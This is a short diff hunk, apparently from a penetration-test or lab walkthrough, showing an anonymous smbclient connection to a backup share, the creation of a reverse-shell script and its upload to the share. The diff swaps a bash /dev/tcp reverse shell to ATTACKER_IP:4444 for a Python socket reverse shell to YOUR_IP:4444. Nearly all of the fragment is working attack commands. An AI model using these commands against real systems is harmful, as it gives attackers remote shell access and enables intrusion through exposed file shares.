@@ -540,8 +540,7 @@ The combination of:
 smbclient //10.0.0.20/backup_drop -N
 
 # Create reverse shell
-echo '#!/bin/bash
-bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
+echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" > shell.sh
 
 # Upload
 smb: \> put shell.sh
